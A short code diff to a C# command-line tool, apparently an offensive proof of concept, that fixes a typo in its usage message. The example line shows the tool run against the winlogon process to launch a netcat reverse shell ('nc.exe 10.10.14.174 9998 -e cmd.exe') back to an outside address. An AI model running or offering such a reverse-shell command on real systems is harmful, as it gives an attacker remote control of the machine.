@@ -81,7 +81,7 @@ class Program
         if (args.Length != 4 || args[0] != "-p" || args[2] != "-c")
         {
             Console.WriteLine("Usage: foxhole.exe -p <process name> -c \"<command to run>\"");
-            Console.WriteLine("Example: .\\sepoc.exe -p winlogon -c \"c:\\temp\\nc.exe 10.10.14.174 9998 - e cmd.exe");
+            Console.WriteLine("Example: .\\sepoc.exe -p winlogon -c \"c:\\temp\\nc.exe 10.10.14.174 9998 -e cmd.exe");
             return;
         }
 
